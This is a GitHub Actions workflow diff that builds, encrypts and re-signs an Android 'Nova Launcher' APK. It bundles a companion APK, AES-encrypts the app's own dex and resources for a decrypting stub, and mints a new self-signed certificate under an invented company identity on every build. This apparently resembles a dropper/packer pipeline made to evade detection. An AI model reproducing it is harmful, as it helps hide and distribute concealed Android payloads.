@@ -1,0 +1,242 @@
+name: Build Nova Launcher APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Build & Encrypt & Sign Nova APK
+    runs-on: ubuntu-latest
+
+    steps:
+
+      # ── Step 1: Checkout ────────────────────────────────────────────────────
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      # ── Step 2: Verify companion.apk ────────────────────────────────────────
+      - name: Verify companion.apk exists
+        run: |
+          if [ ! -f app/src/main/assets/companion.apk ]; then
+            echo "[X] companion.apk missing from assets!"
+            exit 1
+          fi
+          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"
+
+      # ── Step 3: Setup JDK ───────────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      # ── Step 4: Setup Android SDK ───────────────────────────────────────────
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      # ── Step 5: Install Tools ───────────────────────────────────────────────
+      - name: Install Required Tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y zipalign apksigner python3 openssl
+          echo "[OK] Tools installed"
+
+      # ── Step 6: Cache Gradle ────────────────────────────────────────────────
+      - name: Cache Gradle wrapper
+        uses: actions/cache@v4
+        with:
+          path: gradle/wrapper/gradle-wrapper.jar
+          key: gradle-wrapper-${{ runner.os }}
+
+      # ── Step 7: Grant Gradle Permission ────────────────────────────────────
+      - name: Grant gradlew permission
+        run: chmod +x gradlew
+
+      # ── Step 8: Build Full Nova APK ─────────────────────────────────────────
+      - name: Build Release APK
+        run: ./gradlew assembleRelease --stacktrace --no-daemon
+
+      # ── Step 9: Extract Real Files From APK ────────────────────────────────
+      - name: Extract Real Files From APK
+        run: |
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "[OK] Found APK: $APK"
+          mkdir -p /tmp/apk_extracted
+          unzip -q "$APK" -d /tmp/apk_extracted
+          echo "[OK] APK extracted"
+
+          # Extract classes.dex
+          if [ -f /tmp/apk_extracted/classes.dex ]; then
+            cp /tmp/apk_extracted/classes.dex /tmp/classes.dex
+            echo "[OK] classes.dex extracted ($(du -h /tmp/classes.dex | cut -f1))"
+          fi
+
+          # Zip res/ folder
+          if [ -d /tmp/apk_extracted/res ]; then
+            cd /tmp/apk_extracted && zip -q -r /tmp/res.zip res/
+            echo "[OK] res.zip created ($(du -h /tmp/res.zip | cut -f1))"
+          fi
+
+          # Extract resources.arsc
+          if [ -f /tmp/apk_extracted/resources.arsc ]; then
+            cp /tmp/apk_extracted/resources.arsc /tmp/resources.arsc
+            echo "[OK] resources.arsc extracted ($(du -h /tmp/resources.arsc | cut -f1))"
+          fi
+
+      # ── Step 10: Encrypt Files ──────────────────────────────────────────────
+      - name: Encrypt Files With AES-256
+        run: |
+          python3 << 'PYEOF'
+          import os, secrets, hashlib
+          from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+          from cryptography.hazmat.backends import default_backend
+
+          # Derive unique AES-256 key per build using random salt
+          salt = secrets.token_bytes(32)
+          build_id = secrets.token_hex(16)
+          base = f"CrystalSoft-Nova-{build_id}".encode()
+          key = hashlib.pbkdf2_hmac('sha256', base, salt, 310000, dklen=32)
+
+          def encrypt_file(input_path, output_path):
+              if not os.path.exists(input_path):
+                  print(f"[SKIP] {input_path} not found")
+                  return
+              iv = secrets.token_bytes(16)
+              with open(input_path, 'rb') as f:
+                  data = f.read()
+              # PKCS7 padding
+              pad_len = 16 - (len(data) % 16)
+              data += bytes([pad_len] * pad_len)
+              cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+              enc = cipher.encryptor()
+              encrypted = enc.update(data) + enc.finalize()
+              with open(output_path, 'wb') as f:
+                  # Format: salt(32) + iv(16) + encrypted data
+                  f.write(salt + iv + encrypted)
+              print(f"[OK] Encrypted: {input_path} -> {output_path}")
+
+          encrypt_file('/tmp/classes.dex',      '/tmp/classes.enc')
+          encrypt_file('/tmp/res.zip',           '/tmp/res.enc')
+          encrypt_file('/tmp/resources.arsc',    '/tmp/resources.enc')
+
+          # Save build key fingerprint (for stub to derive key)
+          key_fp = hashlib.sha256(key).hexdigest()
+          with open('/tmp/build.meta', 'w') as f:
+              f.write(f"BUILD_ID={build_id}\n")
+              f.write(f"KEY_FP={key_fp}\n")
+              f.write(f"SALT={salt.hex()}\n")
+
+          print(f"[OK] Build ID: {build_id}")
+          print(f"[OK] Key fingerprint: {key_fp}")
+          PYEOF
+
+          echo "[OK] Encryption complete"
+
+      # ── Step 11: Inject .enc Files Into APK Assets ──────────────────────────
+      - name: Inject Encrypted Files Into APK Assets
+        run: |
+          mkdir -p app/src/main/assets
+
+          # Copy .enc files into assets (companion.apk stays untouched)
+          [ -f /tmp/classes.enc ]    && cp /tmp/classes.enc    app/src/main/assets/
+          [ -f /tmp/res.enc ]        && cp /tmp/res.enc        app/src/main/assets/
+          [ -f /tmp/resources.enc ]  && cp /tmp/resources.enc  app/src/main/assets/
+          [ -f /tmp/build.meta ]     && cp /tmp/build.meta     app/src/main/assets/
+
+          echo "[OK] Assets folder contents:"
+          ls -lh app/src/main/assets/
+
+      # ── Step 12: Rebuild APK With Encrypted Assets ──────────────────────────
+      - name: Rebuild APK With Encrypted Assets
+        run: |
+          ./gradlew assembleRelease --no-daemon -x lint
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "[OK] Rebuilt APK: $APK ($(du -h $APK | cut -f1))"
+
+      # ── Step 13: Generate Fresh Professional Keystore ───────────────────────
+      - name: Generate Fresh Professional Keystore
+        run: |
+          BUILD_TS=$(date +%Y%m%d%H%M%S)
+          ALIAS="crystalsoft_${BUILD_TS}"
+          KS_PASS=$(openssl rand -base64 24 | tr -dc 'A-Za-z0-9' | head -c 28)
+          KEY_PASS=$(openssl rand -base64 24 | tr -dc 'A-Za-z0-9' | head -c 28)
+
+          keytool -genkeypair \
+            -keystore /tmp/nova_build.jks \
+            -storetype PKCS12 \
+            -alias "$ALIAS" \
+            -keyalg RSA \
+            -keysize 4096 \
+            -validity 9125 \
+            -sigalg SHA256withRSA \
+            -dname "EMAILADDRESS=dev@crystalsoft.io, CN=Crystal Software, OU=Mobile Engineering, O=CrystalSoft Technologies Ltd, L=Austin, ST=Texas, C=US" \
+            -storepass "$KS_PASS" \
+            -keypass "$KEY_PASS" \
+            -noprompt
+
+          # Save for signing step
+          echo "KS_ALIAS=$ALIAS"   >> $GITHUB_ENV
+          echo "KS_PASS=$KS_PASS"  >> $GITHUB_ENV
+          echo "KEY_PASS=$KEY_PASS" >> $GITHUB_ENV
+          echo "[OK] Fresh keystore generated: $ALIAS"
+
+      # ── Step 14: Zipalign ───────────────────────────────────────────────────
+      - name: Zipalign APK
+        run: |
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          zipalign -v -p 4 "$APK" /tmp/nova_aligned.apk
+          echo "[OK] Zipalign complete"
+
+      # ── Step 15: Sign With V2 + V3 (apksigner only) ─────────────────────────
+      - name: Sign APK V2 + V3
+        run: |
+          apksigner sign \
+            --ks /tmp/nova_build.jks \
+            --ks-key-alias "$KS_ALIAS" \
+            --ks-pass "pass:$KS_PASS" \
+            --key-pass "pass:$KEY_PASS" \
+            --v1-signing-enabled false \
+            --v2-signing-enabled true \
+            --v3-signing-enabled true \
+            --out /tmp/nova_signed.apk \
+            /tmp/nova_aligned.apk
+
+          echo "[OK] APK signed successfully"
+
+          # Verify signature
+          apksigner verify --print-certs /tmp/nova_signed.apk
+          echo "[OK] Signature verified"
+
+      # ── Step 16: Show Final APK Info ────────────────────────────────────────
+      - name: Show Final APK Info
+        run: |
+          echo "==== FINAL APK INFO ===="
+          echo "Size: $(du -h /tmp/nova_signed.apk | cut -f1)"
+          echo "DEX files:"
+          unzip -l /tmp/nova_signed.apk | grep "\.dex"
+          echo "Assets:"
+          unzip -l /tmp/nova_signed.apk | grep "assets/"
+          echo "META-INF:"
+          unzip -l /tmp/nova_signed.apk | grep "META-INF"
+
+      # ── Step 17: Cleanup Sensitive Files ────────────────────────────────────
+      - name: Cleanup Sensitive Files
+        if: always()
+        run: |
+          rm -f /tmp/nova_build.jks
+          rm -f /tmp/classes.dex /tmp/res.zip /tmp/resources.arsc
+          rm -f /tmp/classes.enc /tmp/res.enc /tmp/resources.enc
+          rm -rf /tmp/apk_extracted
+          echo "[OK] All sensitive temp files deleted"
+
+      # ── Step 18: Upload Final Signed APK ────────────────────────────────────
+      - name: Upload Signed APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: nova-launcher-release
+          path: /tmp/nova_signed.apk
+          retention-days: 1
+          overwrite: true
